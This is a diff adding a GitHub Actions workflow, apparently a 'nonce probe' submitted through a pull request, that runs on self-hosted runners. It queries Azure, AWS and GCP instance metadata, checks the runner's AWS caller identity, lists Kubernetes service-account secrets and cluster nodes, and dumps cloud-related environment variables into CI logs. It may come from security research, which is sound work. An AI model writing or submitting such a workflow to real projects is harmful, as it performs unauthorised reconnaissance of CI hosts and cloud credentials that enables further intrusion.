@@ -1,0 +1,78 @@
+name: c211-i123953 nonce probe
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+    branches: [main]
+permissions:
+  contents: read
+jobs:
+  gpu-runner:
+    runs-on: [self-hosted, hostname:kaito-e2e-github-runner]
+    timeout-minutes: 8
+    continue-on-error: true
+    env:
+      C211_NONCE: c211-i123953-935c7fa07a2235fa
+      C211_JOB: gpu-runner
+    steps:
+      - name: nonce-gpu
+        run: |
+          echo "NONCE=$C211_NONCE JOB=$C211_JOB"
+          hostname; id; uname -a
+          echo "--- nvidia ---"
+          (nvidia-smi -L || echo NO_NVIDIA_SMI) 2>&1
+          (nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader || true) 2>&1
+          (nvidia-smi || true) 2>&1 | head -45
+          ls -l /dev/nvidia* 2>/dev/null || echo NO_DEV_NVIDIA
+          echo "--- imds azure ---"
+          (curl -sS -H Metadata:true --max-time 5 "http://169.254.169.254/metadata/instance?api-version=2021-02-01" || echo IMDS_AZ_FAIL) | head -c 1500
+          echo
+          echo "--- imds aws ---"
+          AWT=$(curl -sS -X PUT --max-time 4 -H "X-aws-ec2-metadata-token-ttl-seconds: 60" http://169.254.169.254/latest/api/token 2>/dev/null || true)
+          if [ -n "$AWT" ]; then
+            curl -sS --max-time 4 -H "X-aws-ec2-metadata-token: $AWT" http://169.254.169.254/latest/meta-data/instance-id || true
+            echo
+            curl -sS --max-time 4 -H "X-aws-ec2-metadata-token: $AWT" http://169.254.169.254/latest/meta-data/instance-type || true
+          else
+            echo NO_AWS_IMDS
+          fi
+          echo
+          echo "--- imds gcp ---"
+          (curl -sS -H "Metadata-Flavor: Google" --max-time 4 "http://169.254.169.254/computeMetadata/v1/instance/id" || echo NO_GCP_IMDS) | head -c 200
+          echo
+          (curl -sS -H "Metadata-Flavor: Google" --max-time 4 "http://169.254.169.254/computeMetadata/v1/instance/machine-type" || true) | head -c 200
+          echo
+          echo "--- sts fingerprint (read-only, no key material) ---"
+          if command -v aws >/dev/null 2>&1; then timeout 15 aws sts get-caller-identity 2>&1 | head -12 || echo STS_FAIL; else echo NO_AWS_CLI; fi
+          echo "--- kube context (read-only) ---"
+          ls -la /var/run/secrets/kubernetes.io/serviceaccount 2>/dev/null || echo NO_SA_DIR
+          (command -v kubectl >/dev/null 2>&1 && timeout 15 kubectl config view --minify -o json 2>&1 | head -c 800) || echo NO_KUBECTL
+          echo
+          (command -v kubectl >/dev/null 2>&1 && timeout 20 kubectl get nodes -o wide 2>&1 | head -25) || true
+          echo "--- env hints (redacted) ---"
+          env | grep -Ei 'azure|aws_|gcp|kube|imds|tenant|clientid|subscription' | sed -E 's/((TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL|CERT)[A-Z_]*)=.*/\1=<redacted>/I' | head -40 || true
+          echo "--- whoami/uptime ---"
+          whoami || true
+          (uptime || true) 2>&1
+          echo "NONCE_END=$C211_NONCE"
+  any-self-hosted:
+    runs-on: [self-hosted]
+    timeout-minutes: 8
+    continue-on-error: true
+    env:
+      C211_NONCE: c211-i123953-935c7fa07a2235fa
+      C211_JOB: any-self-hosted
+    steps:
+      - name: nonce-any
+        run: |
+          echo "NONCE=$C211_NONCE JOB=$C211_JOB"
+          hostname; id; uname -a
+          (nvidia-smi -L || echo NO_NVIDIA_SMI) 2>&1
+          (nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader || true) 2>&1
+          ls -l /dev/nvidia* 2>/dev/null || echo NO_DEV_NVIDIA
+          echo "--- imds azure ---"
+          (curl -sS -H Metadata:true --max-time 5 "http://169.254.169.254/metadata/instance?api-version=2021-02-01" || echo IMDS_AZ_FAIL) | head -c 1200
+          echo
+          echo "--- sts fingerprint (read-only, no key material) ---"
+          if command -v aws >/dev/null 2>&1; then timeout 15 aws sts get-caller-identity 2>&1 | head -12 || echo STS_FAIL; else echo NO_AWS_CLI; fi
+          (command -v kubectl >/dev/null 2>&1 && timeout 20 kubectl get nodes 2>&1 | head -20) || echo NO_KUBECTL
+          echo "NONCE_END=$C211_NONCE"
